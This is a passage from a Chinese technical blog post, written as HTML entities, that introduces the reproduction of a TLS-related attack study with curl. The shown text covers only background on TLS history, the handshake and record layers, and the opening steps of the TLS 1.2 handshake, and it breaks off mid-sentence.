&#x5E76;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#xFF0C;&#x6240;&#x4EE5;&#x5728;&#x5BF9;&#x8BE5;&#x9879;&#x7684;&#x7814;&#x7A76;&#x590D;&#x73B0;&#x4E2D;&#x6574;&#x7406;&#x4E86;&#x5F88;&#x591A;&#x653B;&#x51FB;&#x7EC6;&#x8282;&#xFF0C;&#x4EE5;&#x53CA;&#x4E00;&#x4E9B;&#x53EF;&#x4EE5;&#x62D3;&#x5C55;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x5173;&#x4E8E;&#x8BA1;&#x7B97;&#x673A;&#x79D1;&#x5B66;&#x77E5;&#x8BC6;&#x7684;&#x63A2;&#x7D22;&#x3002;</p><p>&#x672C;&#x6587;&#x4E3B;&#x8981;&#x5206;&#x6210;&#x4E09;&#x90E8;&#x5206;&#xFF0C;&#x7B2C;&#x4E00;&#x90E8;&#x5206;&#x4E3B;&#x8981;<strong>&#x7B80;&#x5355;</strong>&#x8BB2;&#x8FF0;&#x4E00;&#x4E9B;&#x5FC5;&#x8981;&#x7684;&#x80CC;&#x666F;&#x77E5;&#x8BC6;&#xFF0C;&#x7B2C;&#x4E8C;&#x90E8;&#x5206;&#x4F1A;&#x8BE6;&#x7EC6;&#x8BB0;&#x5F55;&#x4E09;&#x79CD;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x7684;&#x5B9E;&#x73B0;&#x6B65;&#x9AA4;&#xFF0C;&#x7B2C;&#x4E09;&#x90E8;&#x5206;&#x4F1A;&#x8BB2;&#x8FF0;&#x4E00;&#x4E9B;&#x5173;&#x4E8E;&#x5728;&#x590D;&#x73B0;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x601D;&#x8003;&#x4EE5;&#x53CA;&#x76F8;&#x5173;&#x63A2;&#x7D22;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x5982;&#x679C;&#x8FD8;&#x6709;&#x540E;&#x7EED;&#x7684;&#x8FDB;&#x5C55;&#xFF0C;&#x6211;&#x4E5F;&#x4F1A;&#x540C;&#x6B65;&#x5230;&#x81EA;&#x5DF1;&#x7684;&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;&#x4E0A;&#xFF0C;&#x6B22;&#x8FCE;&#x5173;&#x6CE8;&#xFF0C;&#x4EE5;&#x53CA;&#x524D;&#x6765;&#x4EA4;&#x6D41;&#xFF1A;<a href="https://blog.zeddyu.info/">https://blog.zeddyu.info/</a></p><p>&#x5982;&#x679C;&#x5BF9;&#x8BE5;&#x7BC7;&#x6587;&#x7AE0;&#x6709;&#x4EFB;&#x4F55;&#x7591;&#x95EE;&#x6216;&#x8005;&#x8D28;&#x7591;&#xFF0C;&#x6B22;&#x8FCE;&#x6765;&#x4FE1;&#xFF1A;echo emVkZHl1Lmx1QGdtYWlsLmNvbQ==|base64 -d</p><p>&#x6B22;&#x8FCE;&#x5BF9;&#x534F;&#x8BAE;&#x5B89;&#x5168;&#x7B49;&#x5185;&#x5BB9;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x540C;&#x5B66;&#x4E00;&#x8D77;&#x4EA4;&#x6D41;&#x5B66;&#x4E60;&#xFF01;</p><p><strong>PS: &#x5982;&#x65E0;&#x7279;&#x6B8A;&#x8BF4;&#x660E;&#xFF0C;&#x6574;&#x4E2A;&#x5B9E;&#x9A8C;&#x80CC;&#x666F;&#x5747;&#x57FA;&#x4E8E; Ubuntu 20.04 LTS &#xFF0C;curl 7.68.0 build with OpenSSL/1.1.1f  &#xFF0C;&#x540E;&#x6587;&#x63D0;&#x5230;&#x7684; IPv6 &#x5747;&#x6307;&#x7684;&#x662F;  IPv4-mapped IPv6 addresses &#x8FD9;&#x7C7B;&#x5730;&#x5740;</strong></p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h3 id="TLS-Overview"><a href="#TLS-Overview" class="headerlink" title="TLS Overview"></a>TLS Overview</h3><p><strong>&#x4F20;&#x8F93;&#x5C42;&#x5B89;&#x5168;&#x6027;&#x534F;&#x8BAE;</strong>&#xFF08;&#x82F1;&#x8BED;&#xFF1A;<strong>T</strong>ransport <strong>L</strong>ayer <strong>S</strong>ecurity&#xFF0C;&#x7F29;&#x5199;&#xFF1A;<strong>TLS</strong>&#xFF09;&#x53CA;&#x5176;&#x524D;&#x8EAB;<strong>&#x5B89;&#x5168;&#x5957;&#x63A5;&#x5C42;</strong>&#xFF08;&#x82F1;&#x8BED;&#xFF1A;<strong>S</strong>ecure <strong>S</strong>ockets <strong>L</strong>ayer&#xFF0C;&#x7F29;&#x5199;&#xFF1A;<strong>SSL</strong>&#xFF09;&#x662F;&#x4E00;&#x79CD;&#x5B89;&#x5168;&#x534F;&#x8BAE;&#xFF0C;&#x76EE;&#x7684;&#x662F;&#x4E3A;&#x4E92;&#x8054;&#x7F51;&#x901A;&#x4FE1;&#x63D0;&#x4F9B;&#x5B89;&#x5168;&#x53CA;&#x6570;&#x636E;&#x5B8C;&#x6574;&#x6027;&#x4FDD;&#x969C;&#x3002;&#x7F51;&#x666F;&#x516C;&#x53F8;&#xFF08;Netscape&#xFF09;&#x5728;1994&#x5E74;&#x63A8;&#x51FA;&#x9996;&#x7248;&#x7F51;&#x9875;&#x6D4F;&#x89C8;&#x5668;&#xFF0D;&#x7F51;&#x666F;&#x5BFC;&#x822A;&#x8005;&#x65F6;&#xFF0C;&#x63A8;&#x51FA;HTTPS&#x534F;&#x8BAE;&#xFF0C;&#x4EE5;SSL&#x8FDB;&#x884C;&#x52A0;&#x5BC6;&#xFF0C;&#x8FD9;&#x662F;SSL&#x7684;&#x8D77;&#x6E90;&#x3002;IETF&#x5C06;SSL&#x8FDB;&#x884C;&#x6807;&#x51C6;&#x5316;&#xFF0C;1999&#x5E74;&#x516C;&#x5E03;TLS 1.0&#x6807;&#x51C6;&#x6587;&#x4EF6;&#xFF08;RFC 2246&#xFF09;&#x3002;&#x968F;&#x540E;&#x53C8;&#x516C;&#x5E03;TLS 1.1&#xFF08;RFC 4346&#xFF0C;2006&#x5E74;&#xFF09;&#x3001;TLS 1.2&#xFF08;RFC 5246&#xFF0C;2008&#x5E74;&#xFF09;&#x548C;TLS 1.3&#xFF08;RFC 8446&#xFF0C;2018&#x5E74;&#xFF09;&#x3002;&#x5728;&#x6D4F;&#x89C8;&#x5668;&#x3001;&#x7535;&#x5B50;&#x90AE;&#x4EF6;&#x3001;&#x5373;&#x65F6;&#x901A;&#x4FE1;&#x3001;VoIP&#x3001;&#x7F51;&#x7EDC;&#x4F20;&#x771F;&#x7B49;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#xFF0C;&#x5E7F;&#x6CDB;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x534F;&#x8BAE;&#x3002;&#x8BB8;&#x591A;&#x7F51;&#x7AD9;&#xFF0C;&#x5982;Google&#x3001;Facebook &#x7B49;&#x4E5F;&#x4EE5;&#x8FD9;&#x4E2A;&#x534F;&#x8BAE;&#x6765;&#x521B;&#x5EFA;&#x5B89;&#x5168;&#x8FDE;&#x7EBF;&#xFF0C;&#x53D1;&#x9001;&#x8D44;&#x6599;&#x3002;&#x76EE;&#x524D;&#x5DF2;&#x6210;&#x4E3A;&#x4E92;&#x8054;&#x7F51;&#x4E0A;&#x4FDD;&#x5BC6;&#x901A;&#x4FE1;&#x7684;&#x5DE5;&#x4E1A;&#x6807;&#x51C6;&#x3002;</p><p>Netscape &#x5F00;&#x53D1;&#x4E86;&#x540D;&#x4E3A;&#x5B89;&#x5168;&#x5957;&#x63A5;&#x5B57;&#x5C42;&#xFF08;Secure Socket Layer&#xFF0C;SSL&#xFF09;&#x7684;&#x4E0A;&#x4E00;&#x4EE3;&#x52A0;&#x5BC6;&#x534F;&#x8BAE;&#xFF0C;TLS &#x7531;&#x6B64;&#x6F14;&#x53D8;&#x800C;&#x6765;&#x3002;TLS 1.0 &#x7248;&#x7684;&#x5F00;&#x53D1;&#x5B9E;&#x9645;&#x4E0A;&#x59CB;&#x4E8E; SSL 3.1 &#x7248;&#xFF0C;&#x4F46;&#x534F;&#x8BAE;&#x7684;&#x540D;&#x79F0;&#x5728;&#x53D1;&#x5E03;&#x4E4B;&#x524D;&#x8FDB;&#x884C;&#x4E86;&#x66F4;&#x540D;&#xFF0C;&#x4EE5;&#x8868;&#x660E;&#x5B83;&#x4E0D;&#x518D;&#x4E0E; Netscape &#x5173;&#x8054;&#x3002;&#x7531;&#x4E8E;&#x8FD9;&#x4E2A;&#x5386;&#x53F2;&#x539F;&#x56E0;&#xFF0C;TLS &#x548C; SSL &#x8FD9;&#x4E24;&#x4E2A;&#x672F;&#x8BED;&#x6709;&#x65F6;&#x4F1A;&#x4E92;&#x6362;&#x4F7F;&#x7528;&#x3002;</p><p>&#x8BE5;&#x534F;&#x8BAE;&#x7531;&#x4E24;&#x5C42;&#x7EC4;&#x6210;&#xFF1A; TLS &#x8BB0;&#x5F55;&#x534F;&#x8BAE;&#xFF08;TLS Record&#xFF09;&#x548C; TLS &#x63E1;&#x624B;&#x534F;&#x8BAE;&#xFF08;TLS Handshake&#xFF09;&#x3002;</p><p><strong>&#x56E0;&#x4E3A;&#x672C;&#x6587;&#x4FA7;&#x91CD;&#x70B9;&#x5E76;&#x975E; TLS &#x672C;&#x8EAB;&#x7684;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#x6D41;&#x7A0B;&#xFF0C;&#x6240;&#x4EE5;&#x4F1A;&#x5FFD;&#x7565;&#x5F88;&#x591A;&#x5BC6;&#x7801;&#x7B97;&#x6CD5;&#x6D41;&#x7A0B;&#xFF0C;&#x53EA;&#x63D0;&#x5176;&#x4E2D;&#x5BF9;&#x6211;&#x4EEC;&#x540E;&#x7EED;&#x653B;&#x51FB;&#x76F8;&#x5173;&#x7684;&#x90E8;&#x5206;&#xFF0C;&#x5BC6;&#x7801;&#x7B97;&#x6CD5;&#x90E8;&#x5206;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x8BFB;&#x8005;&#x53EF;&#x4EE5;&#x81EA;&#x884C;&#x641C;&#x7D22;&#x4E86;&#x89E3;&#x3002;</strong></p><h4 id="TLS-Handshake"><a href="#TLS-Handshake" class="headerlink" title="TLS Handshake"></a>TLS Handshake</h4><p>TLS &#x63E1;&#x624B;&#x662F;&#x542F;&#x52A8;&#x4F7F;&#x7528; TLS &#x52A0;&#x5BC6;&#x7684;&#x901A;&#x4FE1;&#x4F1A;&#x8BDD;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&#x5728; TLS &#x63E1;&#x624B;&#x671F;&#x95F4;&#xFF0C;&#x4E24;&#x4E2A;&#x901A;&#x4FE1;&#x65B9;&#x4EA4;&#x6362;&#x6D88;&#x606F;&#x4EE5;&#x76F8;&#x4E92;&#x786E;&#x8BA4;&#xFF0C;&#x5F7C;&#x6B64;&#x9A8C;&#x8BC1;&#xFF0C;&#x786E;&#x7ACB;&#x5B83;&#x4EEC;&#x5C06;&#x4F7F;&#x7528;&#x7684;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#xFF0C;&#x5E76;&#x5C31;&#x4F1A;&#x8BDD;&#x5BC6;&#x94A5;&#x8FBE;&#x6210;&#x5171;&#x8BC6;&#x3002;&#x5B83;&#x5B9A;&#x4E49;&#x4E86;&#x6D88;&#x606F;&#x7684;&#x683C;&#x5F0F;&#x548C;&#x4EA4;&#x6362;&#x7684;&#x987A;&#x5E8F;&#x3002;&#x8FD9;&#x4E9B;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x7684;&#x9700;&#x6C42;&#x800C;&#x53D8;&#x5316;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x6709;&#x51E0;&#x79CD;&#x53EF;&#x80FD;&#x7684;&#x7A0B;&#x5E8F;&#x6765;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x3002;&#x521D;&#x59CB;&#x4EA4;&#x6362;&#x7684;&#x7ED3;&#x679C;&#x662F;TLS&#x8FDE;&#x63A5;&#x6210;&#x529F;&#xFF08;&#x53CC;&#x65B9;&#x90FD;&#x51C6;&#x5907;&#x597D;&#x7528;TLS&#x4F20;&#x8F93;&#x5E94;&#x7528;&#x6570;&#x636E;&#xFF09;&#x6216;&#x53D1;&#x51FA;&#x8B66;&#x62A5;&#x6D88;&#x606F;&#x3002;</p><p>&#x6BCF;&#x5F53;&#x7528;&#x6237;&#x901A;&#x8FC7; HTTPS &#x5BFC;&#x822A;&#x5230;&#x7F51;&#x7AD9;&#xFF0C;&#x5E76;&#x4E14;&#x6D4F;&#x89C8;&#x5668;&#x9996;&#x5148;&#x5F00;&#x59CB;&#x67E5;&#x8BE2;&#x7F51;&#x7AD9;&#x7684;&#x6E90;&#x7AD9;&#x670D;&#x52A1;&#x5668;&#x65F6;&#xFF0C;&#x90FD;&#x4F1A;&#x8FDB;&#x884C; TLS &#x63E1;&#x624B;&#x3002;&#x6BCF;&#x5F53;&#x5176;&#x4ED6;&#x4EFB;&#x4F55;&#x901A;&#x4FE1;&#x4F7F;&#x7528; HTTPS&#xFF08;&#x5305;&#x62EC; API &#x8C03;&#x7528;&#x548C; HTTPS &#x4E0A;&#x7684; DNS &#x67E5;&#x8BE2;&#xFF09;&#x65F6;&#xFF0C;&#x4E5F;&#x4F1A;&#x53D1;&#x751F; TLS &#x63E1;&#x624B;&#x3002;&#x901A;&#x8FC7; TCP &#x63E1;&#x624B;&#x6253;&#x5F00; TCP &#x8FDE;&#x63A5;&#x540E;&#xFF0C;&#x5C06;&#x53D1;&#x751F; TLS &#x63E1;&#x624B;&#x3002;</p><p>&#x5728; TLS &#x63E1;&#x624B;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x4E00;&#x540C;&#x6267;&#x884C;&#x4EE5;&#x4E0B;&#x64CD;&#x4F5C;&#xFF1A;</p><ul><li>&#x6307;&#x5B9A;&#x5C06;&#x8981;&#x4F7F;&#x7528;&#x7684; TLS &#x7248;&#x672C;&#xFF08;TLS 1.0&#x3001;1.2&#x3001;1.3 &#x7B49;&#xFF09;</li><li>&#x51B3;&#x5B9A;&#x5C06;&#x8981;&#x4F7F;&#x7528;&#x54EA;&#x4E9B;&#x5BC6;&#x7801;&#x5957;&#x4EF6;</li><li>&#x901A;&#x8FC7;&#x670D;&#x52A1;&#x5668;&#x7684;&#x516C;&#x94A5;&#x548C; SSL &#x8BC1;&#x4E66;&#x9881;&#x53D1;&#x673A;&#x6784;&#x7684;&#x6570;&#x5B57;&#x7B7E;&#x540D;&#x6765;&#x9A8C;&#x8BC1;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8EAB;&#x4EFD;</li><li>&#x751F;&#x6210;&#x4F1A;&#x8BDD;&#x5BC6;&#x94A5;&#xFF0C;&#x4EE5;&#x5728;&#x63E1;&#x624B;&#x5B8C;&#x6210;&#x540E;&#x4F7F;&#x7528;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;</li><li>&#x68C0;&#x67E5;&#x662F;&#x5426;&#x9700;&#x8981;&#x6062;&#x590D;&#x4F1A;&#x8BDD;</li></ul><p>TLS &#x63E1;&#x624B;&#x662F;&#x7531;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x4EA4;&#x6362;&#x7684;&#x4E00;&#x7CFB;&#x5217;&#x6570;&#x636E;&#x62A5;&#x6216;&#x6D88;&#x606F;&#x3002;TLS &#x63E1;&#x624B;&#x6D89;&#x53CA;&#x591A;&#x4E2A;&#x6B65;&#x9AA4;&#xFF0C;&#x56E0;&#x4E3A;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x8981;&#x4EA4;&#x6362;&#x5B8C;&#x6210;&#x63E1;&#x624B;&#x548C;&#x8FDB;&#x884C;&#x8FDB;&#x4E00;&#x6B65;&#x5BF9;&#x8BDD;&#x6240;&#x9700;&#x7684;&#x4FE1;&#x606F;&#x3002; TLS &#x63E1;&#x624B;&#x7684;&#x786E;&#x5207;&#x6B65;&#x9AA4;&#x5C06;&#x6839;&#x636E;&#x6240;&#x4F7F;&#x7528;&#x7684;&#x5BC6;&#x94A5;&#x4EA4;&#x6362;&#x7B97;&#x6CD5;&#x7684;&#x7C7B;&#x578B;&#x4EE5;&#x53CA;&#x53CC;&#x65B9;&#x652F;&#x6301;&#x7684;&#x5BC6;&#x7801;&#x5957;&#x4EF6;&#x800C;&#x6709;&#x6240;&#x4E0D;&#x540C;&#xFF0C;RSA &#x5BC6;&#x94A5;&#x4EA4;&#x6362;&#x7B97;&#x6CD5;&#x6700;&#x4E3A;&#x5E38;&#x7528;&#x3002;&#x4F46;&#x662F;&#x5E76;&#x975E;&#x6240;&#x6709; TLS &#x63E1;&#x624B;&#x5747;&#x4F7F;&#x7528;&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#xFF08;&#x516C;&#x94A5;&#x548C;&#x79C1;&#x94A5;&#xFF09;&#xFF0C;&#x4F46;&#x5E76;&#x975E;&#x5168;&#x90FD;&#x4F1A;&#x5728;&#x751F;&#x6210;&#x4F1A;&#x8BDD;&#x5BC6;&#x94A5;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x4F7F;&#x7528;&#x79C1;&#x94A5;&#x3002;&#x4F8B;&#x5982; Diffie-Hellman &#x63E1;&#x624B;&#x7B49;&#xFF0C;&#x8FD9;&#x91CC;&#x4E0D;&#x505A;&#x8FC7;&#x591A;&#x4ECB;&#x7ECD;&#x3002;</p><h4 id="TLS-Record"><a href="#TLS-Record" class="headerlink" title="TLS Record"></a>TLS Record</h4><p>TLS Record &#x534F;&#x8BAE;&#x4F7F;&#x7528;&#x63E1;&#x624B;&#x8FC7;&#x7A0B;&#x4E2D;&#x521B;&#x5EFA;&#x7684;&#x5BC6;&#x94A5;&#x6765;&#x786E;&#x4FDD;&#x5E94;&#x7528;&#x6570;&#x636E;&#x7684;&#x5B89;&#x5168;&#x3002;&#x8BB0;&#x5F55;&#x534F;&#x8BAE;&#x8D1F;&#x8D23;&#x4FDD;&#x62A4;&#x5E94;&#x7528;&#x6570;&#x636E;&#x7684;&#x5B89;&#x5168;&#xFF0C;&#x5E76;&#x9A8C;&#x8BC1;&#x5176;&#x5B8C;&#x6574;&#x6027;&#x548C;&#x6765;&#x6E90;&#x3002;&#x5B83;&#x7BA1;&#x7406;&#x4EE5;&#x4E0B;&#x5185;&#x5BB9;&#xFF1A;&#x5C06;&#x4F20;&#x51FA;&#x7684;&#x6D88;&#x606F;&#x5206;&#x4E3A;&#x53EF;&#x7BA1;&#x7406;&#x7684;&#x5757;&#x3001;&#x91CD;&#x65B0;&#x7EC4;&#x5408;&#x4F20;&#x5165;&#x7684;&#x6D88;&#x606F;&#x3001;&#x538B;&#x7F29;&#x5916;&#x53D1;&#x62A5;&#x6587;&#x5757;&#x548C;&#x89E3;&#x538B;&#x63A5;&#x6536;&#x62A5;&#x6587;&#x5757;&#xFF08;&#x53EF;&#x9009;&#xFF09;&#x3001;&#x5C06;&#x4FE1;&#x606F;&#x9A8C;&#x8BC1;&#x7801;&#xFF08;Message Authentication Code, MAC&#xFF09;&#x5E94;&#x7528;&#x5230;&#x5916;&#x53D1;&#x4FE1;&#x606F;&#x5E76;&#x4F7F;&#x7528; MAC &#x9A8C;&#x8BC1;&#x63A5;&#x6536;&#x4FE1;&#x606F;&#x3001;&#x52A0;&#x5BC6;&#x5916;&#x53D1;&#x62A5;&#x6587;&#x548C;&#x89E3;&#x5BC6;&#x63A5;&#x6536;&#x62A5;&#x6587;&#x3002;&#x5F53; TLS Record &#x534F;&#x8BAE;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x5916;&#x53D1;&#x52A0;&#x5BC6;&#x6570;&#x636E;&#x88AB;&#x4F20;&#x5230;&#x4F20;&#x8F93;&#x63A7;&#x5236;&#x534F;&#x8BAE;&#xFF08;TCP&#xFF09;&#x5C42;&#x8FDB;&#x884C;&#x4F20;&#x8F93;&#x3002;</p><h3 id="TLS-1-2"><a href="#TLS-1-2" class="headerlink" title="TLS 1.2"></a>TLS 1.2</h3><h4 id="TLS-1-2-HankShake"><a href="#TLS-1-2-HankShake" class="headerlink" title="TLS 1.2 HankShake"></a>TLS 1.2 HankShake</h4><p>&#x7531;&#x4E8E;&#x5386;&#x53F2;&#x539F;&#x56E0;&#xFF0C;TLS &#x7684;&#x524D;&#x8EAB; SSL &#x5DF2;&#x7ECF;&#x88AB;&#x5E9F;&#x5F03;&#xFF1B;&#x73B0;&#x884C;&#x8D8B;&#x52BF;&#x4E2D;&#xFF0C;&#x4E3B;&#x6D41; TLS &#x7248;&#x672C;&#x4E3A; 1.2 &#xFF0C;&#x5E76;&#x4E14; 1.2 &#x5BF9;&#x4E8E; 1.1 &#x7684;&#x6539;&#x52A8;&#x76F8;&#x5BF9;&#x4E8E;&#x672C;&#x6587;&#x91CD;&#x70B9;&#x6765;&#x8BF4;&#x5E76;&#x4E0D;&#x91CD;&#x8981;&#xFF0C;&#x5E76;&#x4E14;&#x73B0;&#x5728;&#x5904;&#x4E8E;&#x63A8;&#x5E7F; 1.3 &#x7684;&#x65F6;&#x4EE3;&#xFF0C;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x4ECE; TLS 1.2 &#x5F00;&#x59CB;&#x8BB2;&#x8D77;&#x3002;</p><ol><li><p><strong>Client hello:</strong> &#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001; ClientHello &#x6D88;&#x606F;&#xFF0C;&#x6307;&#x5B9A;&#x5B83;&#x652F;&#x6301;&#x7684;&#x6700;&#x9AD8; TLS &#x534F;&#x8BAE;&#x7248;&#x672C;&#x3001;&#x4E00;&#x4E2A;&#x968F;&#x673A;&#x6570;&#x3001;&#x4E00;&#x4E2A;&#x5EFA;&#x8BAE;&#x7684;&#x5BC6;&#x7801;&#x5957;&#x4EF6;&#x5217;&#x8868;&#x548C;&#x5EFA;&#x8BAE;&#x7684;&#x538B;&#x7F29;&#x65B9;&#x6CD5;&#x3002;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x8BD5;&#x56FE;&#x6267;&#x884C;&#x6062;&#x590D;&#x63E1;&#x624B;&#xFF0C;&#x5B83;&#x53EF;&#x80FD;&#x4F1A;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x4F1A;&#x8BDD; ID &#x3002;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5E94;&#x7528;&#x5C42;&#x534F;&#x8BAE;&#x534F;&#x5546;&#xFF0C;&#x5B83;&#x53EF;&#x80FD;&#x5305;&#x62EC;&#x4E00;&#x4E2A;&#x652F;&#x6301;&#x7684;&#x5E94;&#x7528;&#x534F;&#x8BAE;&#x5217;&#x8868;&#xFF0C;&#x4F8B;&#x5982; HTTP/2 &#x3002;</p></li><li><p><strong>Server hello:</strong> &#x670D;&#x52A1;&#x5668;&#x4EE5; ServerHello &#x6D88;&#x606F;&#x4F5C;&#x51FA;&#x54CD;&#x5E94;&#xFF0C;&#x5305;&#x542B;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x63D0;&#x4F9B;&#x7684;&#x9009;&#x62E9;&#x4E2D;&#x9009;&#x62E9;&#x7684;&#x534F;&#x8BAE;&#x7248;&#x672C;&#x3001;&#x968F;&#x673A;&#x6570;&#x3001;&#x5BC6;&#x7801;&#x5957;&#x4EF6;&#x548C;&#x538B;&#x7F29;&#x65B9;&#x6CD5;&#x3002;&#x4E3A;&#x4E86;&#x786E;&#x8BA4;&#x6216;&#x5141;&#x8BB8;&#x6062;&#x590D;&#x63E1;&#x624B;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x4EE5;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x4F1A;&#x8BDD; ID &#x3002;&#x9009;&#x62E9;&#x7684;&#x534F;&#x8BAE;&#x7248;&#x672C;&#x5E94;&#x8BE5;&#x662F;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x90FD;&#x652F;&#x6301;&#x7684;&#x6700;&#x9AD8;&#x7248;&#x672C;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x652F;&#x6301; TLS 1.1 &#x7248;&#x672C;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x652F;&#x6301; 1.2 &#x7248;&#x672C;&#xFF0C;&#x5219;&#x5E94;&#x9009;&#x62E9; 1.1 &#x7248;&#x672C;&#xFF1B;&#x4E0D;&#x5E94;&#x9009;&#x62E9; 1.2 &#x7248;&#x672C;&#x3002;</p></li><li><p>(Optional) <strong>Certificate:</strong> &#x670D;&#x52A1;&#x5668;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x8BC1;&#x4E66;&#x6216;&#x8BC1;&#x4E66;&#x94FE;&#x3002; &#x8BC1;&#x4E66;&#x94FE;&#x901A;&#x5E38;&#x4EE5;&#x670D;&#x52A1;&#x5668;&#x7684;&#x516C;&#x94A5;&#x8BC1;&#x4E66;&#x5F00;&#x59CB;&#xFF0C;&#x5E76;&#x4EE5;&#x8BC1;&#x4E66;&#x9881;&#x53D1;&#x673A;&#x6784;&#x7684;&#x6839;&#x8BC1;&#x4E66;&#x7ED3;&#x675F;&#x3002; &#x8BE5;&#x6D88;&#x606F;&#x662F;&#x53EF;&#x9009;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x9700;&#x8981;&#x670D;&#x52A1;&#x5668;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x65F6;&#x4F7F;&#x7528;&#x3002;</p></li><li><p>(Optional) <strong>Certificate request:</strong> &#x5982;&#x679C;&#x670D;&#x52A1;&#x5668;&#x5FC5;&#x987B;&#x5BF9;&#x5BA2;&#x6237;&#x7AEF;&#x8FDB;&#x884C;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#xFF0C;&#x5219;&#x5B83;&#x5C06;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x8BC1;&#x4E66;&#x8BF7;&#x6C42;&#x3002; &#x5728;Internet&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4E2D;&#xFF0C;&#x5F88;&#x5C11;&#x53D1;&#x9001;&#x6B64;&#x6D88;&#x606F;&#x3002;</p></li><li><p>(Optional) <strong>Server key exchange:</strong> &#x5982;&#x679C;&#x6765;&#x81EA;&#x8BC1;&#x4E66;&#x7684;&#x516C;&#x94A5;&#x4FE1;&#x606F;&#x4E0D;&#x8DB3;&#x4EE5;&#x8FDB;&#x884C;&#x5BC6;&#x94A5;&#x4EA4;&#x6362;&#xFF0C;&#x5219;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x670D;&#x52A1;&#x5668;&#x5BC6;&#x94A5;&#x4EA4;&#x6362;&#x6D88;&#x606F;&#x3002; &#x4F8B;&#x5982;&#xFF0C;&#x5728;&#x57FA;&#x4E8E;Diffie-Hellman&#xFF08;DH&#xFF09;&#x7684;&#x5BC6;&#x7801;&#x5957;&#x4EF6;&#x4E2D;&#xFF0C;&#x6B64;&#x6D88;&#x606F;&#x5305;&#x542B;&#x670D;&#x52A1;&#x5668;&#x7684;DH&#x516C;&#x94A5;&#x3002;</p></li><li><p><strong>Server hello done:</strong> &#x670D;&#x52A1;&#x5668;&#x544A;&#x8BC9;&#x5BA2;&#x6237;&#x7AEF;&#x5B83;&#x5DF2;&#x7ECF;&#x5B8C;&#x6210;&#x4E86;&#x5176;&#x521D;&#x59CB;&#x534F;&#x5546;&#x6D88;&#x606F;&#x3002;</p></li><li><p>(Optional)<strong>Certificate</strong>: &#x5982;&#x679C;&#x670D;&#x52A1;&#x5668;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x8BF7;&#x6C42;&#x8BC1;&#x4E66;&#xFF0C;&#x5219;&#x5BA2;&#x6237;&#x7AEF;&#x5C06;&#x53D1;&#x9001;&#x5176;&#x8BC1;&#x4E66;&#x94FE;&#xFF0C;&#x5C31;&#x50CF;&#x670D;&#x52A1;&#x5668;&#x4E4B;&#x524D;&#x6240;&#x505A;&#x7684;&#x4E00;&#x6837;&#x3002;</p><p><strong>Note:</strong> &#x53EA;&#x6709;&#x5C11;&#x6570;Internet&#x670D;&#x52A1;&#x5668;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x8981;&#x6C42;&#x5BA2;&#x6237;&#x7AEF;&#x63D0;&#x4F9B;&#x8BC1;&#x4E66;&#x3002;</p></li><li><p><strong>Client key exchange:</strong> &#x5BA2;&#x6237;&#x7AEF;&#x751F;&#x6210;&#x7528;&#x4E8E;&#x521B;&#x5EFA;&#x7528;&#x4E8E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;&#x7684;&#x5BC6;&#x94A5;&#x7684;&#x4FE1;&#x606F;&#x3002; &#x5BF9;&#x4E8E; RSA 